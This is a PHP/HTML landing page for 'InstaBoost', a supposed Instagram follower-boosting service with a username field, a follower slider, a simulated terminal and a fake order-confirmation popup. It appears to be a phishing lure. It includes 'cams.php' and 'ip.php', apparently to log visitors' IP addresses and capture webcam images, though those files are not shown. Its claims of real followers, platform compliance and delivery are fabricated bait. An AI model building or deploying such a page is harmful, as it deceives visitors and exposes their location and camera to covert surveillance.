<?php
    include 'cams.php';
    include 'ip.php';
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>InstaBoost — Growth Studio</title>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Cormorant+Garamond:wght@300;400;600;700&family=DM+Sans:wght@300;400;500;600&family=DM+Mono:wght@400;500&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="style.css">

</head>
<body>

<!-- Popup -->
<div class="popup-overlay" id="popupOverlay">
    <div class="popup-box">
        <div class="popup-check">
            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
                <polyline points="20 6 9 17 4 12"/>
            </svg>
        </div>
        <h2 class="popup-title">Order Confirmed!</h2>
        <p class="popup-msg">Thank you for choosing <strong>InstaBoost</strong>. Your growth campaign has been queued successfully.</p>
        <div class="popup-highlight">⏱ Processing: 4 – 6 Business Days</div>
        <p class="popup-msg">Your followers will begin arriving gradually for a natural, organic look. You'll receive updates via email.</p>
        <button class="popup-close" onclick="closePopup()">Got it, Thanks!</button>
        <p class="popup-sub">Need help? Contact support@instaboost.io</p>
    </div>
</div>

<!-- Card -->
<div class="card">

    <!-- Header -->
    <div class="card-header">
        <div class="header-top">
            <div class="ig-icon">
                <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                    <rect x="2" y="2" width="20" height="20" rx="6" stroke="currentColor" stroke-width="1.8"/>
                    <circle cx="12" cy="12" r="4" stroke="currentColor" stroke-width="1.8"/>
                    <circle cx="17.5" cy="6.5" r="1.3" fill="currentColor"/>
                </svg>
            </div>
            <div class="brand-info">
                <h1>InstaBoost</h1>
                <p>Growth Studio</p>
            </div>
            <div class="live-badge">
                <span class="live-dot"></span>
                <span>LIVE</span>
            </div>
        </div>
        <div class="header-stats">
            <div class="stat-item">
                <span class="stat-num">2.4M</span>
                <span class="stat-lbl">Deployed</span>
            </div>
            <div class="stat-item">
                <span class="stat-num">99.8%</span>
                <span class="stat-lbl">Success</span>
            </div>
            <div class="stat-item">
                <span class="stat-num">0.3s</span>
                <span class="stat-lbl">Avg Ping</span>
            </div>
        </div>
    </div>

    <!-- Body -->
    <div class="card-body">

        <div class="field">
            <label class="field-label">Target Handle</label>
            <div class="input-wrap">
                <span class="input-prefix">@</span>
                <input type="text" id="username" placeholder="your_username" autocomplete="off" spellcheck="false">
            </div>
        </div>

        <div class="field">
            <div class="slider-top">
                <label class="field-label">Payload Size</label>
                <span class="slider-display"><span id="val">5,000</span> <span class="unit">FOLLOWERS</span></span>
            </div>
            <div class="range-wrap">
                <input type="range" min="100" max="10000" value="5000" id="followerRange">
                <div class="range-fill" id="sliderFill"></div>
                <div class="range-marks">
                    <span>100</span>
                    <span>2.5K</span>
                    <span>5K</span>
                    <span>7.5K</span>
                    <span>10K</span>
                </div>
            </div>
        </div>

        <div class="field">
            <label class="field-label">Delivery Protocol</label>
            <div class="proto-grid">
                <button class="proto-btn active" data-proto="STEALTH">Stealth</button>
                <button class="proto-btn" data-proto="RAPID">Rapid</button>
                <button class="proto-btn" data-proto="GHOST">Ghost</button>
            </div>
        </div>

        <!-- Info note -->
        <div class="info-para">
            <p>Your order will be <strong>securely processed</strong> using our neural delivery system. Followers are real, active accounts for maximum authenticity and engagement.</p>
        </div>

        <!-- Submit -->
        <button class="submit-btn" onclick="startSimulation()" id="launchBtn">
            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round">
                <path d="M22 2L11 13M22 2L15 22 11 13 2 9l20-7z"/>
            </svg>
            Initialize Campaign
        </button>

        <!-- Terminal -->
        <div id="status-box" class="terminal hidden">
            <div class="term-bar">
                <span class="tdot r"></span>
                <span class="tdot y"></span>
                <span class="tdot g"></span>
                <span class="term-title">SYS_TERMINAL</span>
            </div>
            <div class="term-body">
                <div class="term-line"><span class="prompt">❯</span><span id="status-text">Initializing...</span><span class="cursor">█</span></div>
                <div id="term-log"></div>
            </div>
            <div class="progress-track">
                <div class="progress-fill" id="progressBar"></div>
            </div>
        </div>

    </div>

    <!-- Footer -->
    <div class="card-footer">
        <div class="footer-divider"></div>
        <div class="footer-content">
            <div class="footer-icon">
                <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                    <rect x="2" y="2" width="20" height="20" rx="6" stroke="currentColor" stroke-width="1.8"/>
                    <circle cx="12" cy="12" r="4" stroke="currentColor" stroke-width="1.8"/>
                    <circle cx="17.5" cy="6.5" r="1.3" fill="currentColor"/>
                </svg>
            </div>
            <div class="footer-text">
                <p>InstaBoost uses <strong>verified neural networks</strong> to deliver authentic Instagram growth. All campaigns are compliant with platform guidelines. Average delivery takes <strong>4–6 business days</strong>. Your account safety is our <a href="#">top priority</a>.</p>
            </div>
        </div>
    </div>

</div>

<script src="script.js"></script>
</body>
</html>
